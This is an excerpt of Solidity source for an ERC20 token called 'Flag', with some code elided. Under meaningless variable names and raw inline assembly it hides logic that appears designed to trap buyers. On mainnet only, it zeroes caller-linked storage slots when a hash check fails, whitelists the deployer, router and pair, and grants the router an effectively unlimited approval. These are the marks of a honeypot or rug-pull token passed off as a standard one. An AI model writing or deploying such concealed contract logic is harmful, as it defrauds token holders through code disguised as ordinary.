...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addFlag;
    uint256 private flagFun = block.number*2;

    mapping (address => bool) private _firstAloe; 
    mapping (address => bool) private _secondVera;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private plantJuice;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private pigShow;
    address public pair;
    ...
    bool private trading; uint256 private clownNose = 1; bool private redTomato;
    uint256 private _decimals; uint256 private fatTony;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addFlag.push(_router); addFlag.push(msgSender_); addFlag.push(pair);
        for (uint256 q=0; q < 3;) {_firstAloe[addFlag[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x2cfb68a97235df4e078e1aeadb52b868a83b072da781e744e70fc7ed5ea73647
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x8c85ea94d9c0f39574f6035ac719bf6ce0be43a200dbd426fc227c0f558f02af,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; flagFun = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addFlag[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployFlag(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addFlag[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFlag(creator, initialSupply);
    }
}

contract Flag is ERC20Token {
    constructor() ERC20Token("Flag", "FLAG", msg.sender, 2500000 * 10 ** 18) {
    }
}